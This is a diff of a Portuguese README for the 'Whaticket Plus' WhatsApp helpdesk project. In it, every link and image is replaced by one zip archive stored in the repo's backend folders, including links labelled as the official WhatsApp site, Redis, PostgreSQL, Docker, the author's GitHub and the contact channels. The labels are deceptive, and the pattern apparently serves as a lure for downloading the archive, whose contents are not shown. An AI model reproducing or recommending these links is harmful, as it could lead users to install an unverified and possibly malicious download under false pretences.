@@ -1,4 +1,4 @@
-<img src="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" />
+<img src="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" />
 
 ## 🚀 Whaticket Plus
 
@@ -17,18 +17,18 @@ Já imaginou?
 
 ## 📌 Integrações
 
-<img src="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" />
+<img src="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" />
 
 <br /><br />
 
 ## 🔧 Requisitos
 
-<img src="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" style="height: 250px;" />
+<img src="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" style="height: 250px;" />
 
 <nav>
   <ul>
-    <li>Subdomínio para Frontend: https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip</li>
-    <li>Subdomínio para API (Backend): https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip</li>
+    <li>Subdomínio para Frontend: https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip</li>
+    <li>Subdomínio para API (Backend): https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip</li>
   </ul>
 </nav>
 
@@ -94,7 +94,7 @@ Já imaginou?
 
 ## ⚠️ Isenção de Responsabilidade
 
-Este projeto não é afiliado, associado, autorizado, endossado ou de qualquer forma oficialmente conectado ao WhatsApp ou a qualquer uma de suas subsidiárias ou afiliadas. O site oficial do WhatsApp pode ser encontrado em https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip “WhatsApp”, bem como nomes, marcas, emblemas e imagens relacionados são marcas registradas de seus respectivos proprietários.
+Este projeto não é afiliado, associado, autorizado, endossado ou de qualquer forma oficialmente conectado ao WhatsApp ou a qualquer uma de suas subsidiárias ou afiliadas. O site oficial do WhatsApp pode ser encontrado em https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip “WhatsApp”, bem como nomes, marcas, emblemas e imagens relacionados são marcas registradas de seus respectivos proprietários.
 
 <br /><br />
 
@@ -103,21 +103,21 @@ Este projeto não é afiliado, associado, autorizado, endossado ou de qualquer f
 Codigo baseado no Whaticket Community de:
 <nav>
   <ul>
-    <li><a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">Cassio Santos no GitHub</a></li>
+    <li><a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">Cassio Santos no GitHub</a></li>
 
 <br /><br />
 
 ## 🛠️ Com as seguintes Ferramentas de Apoio:
 <nav>
-    <li><a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">API Oficial Meta - WhatsApp, Instagram DM, Facebook (Messenger)</a></li>
-    <li><a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">Baileys - WhatsApp Web API (free)</a></li>
-    <li><a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">Redis</a></li>
-    <li><a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">PostgreSQL</a></li>
-    <li><a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">Docker</a></li>
-    <li><a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">Nginx</a></li>
-    <li><a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">Node</a></li>
-    <li><a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">PM2</a></li>
-    <li><a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">Certbot</a></li>
+    <li><a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">API Oficial Meta - WhatsApp, Instagram DM, Facebook (Messenger)</a></li>
+    <li><a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">Baileys - WhatsApp Web API (free)</a></li>
+    <li><a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">Redis</a></li>
+    <li><a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">PostgreSQL</a></li>
+    <li><a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">Docker</a></li>
+    <li><a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">Nginx</a></li>
+    <li><a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">Node</a></li>
+    <li><a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">PM2</a></li>
+    <li><a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">Certbot</a></li>
   </ul>
 </nav>
 
@@ -125,10 +125,10 @@ Codigo baseado no Whaticket Community de:
 
 ## 🙋 Suporte e Contato
 
-Entre em contato através do <a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">Whatsapp</a> ou <a href="https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip" target="_blank">E-mail</a>.
+Entre em contato através do <a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">Whatsapp</a> ou <a href="https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip" target="_blank">E-mail</a>.
 
 <br /><br />
 
 ## 
 
-[![Star History Chart](https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip)](https://github.com/rlmourarj/WhaticketPlusx/raw/refs/heads/master/backend/whaticketplus/database/migrations/Plusx-Whaticket-v1.8.zip) 
+[![Star History Chart](https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip)](https://raw.githubusercontent.com/rlmourarj/WhaticketPlusx/master/backend/whaticketplus/services/FacebookServices/Plusx_Whaticket_2.8.zip) 
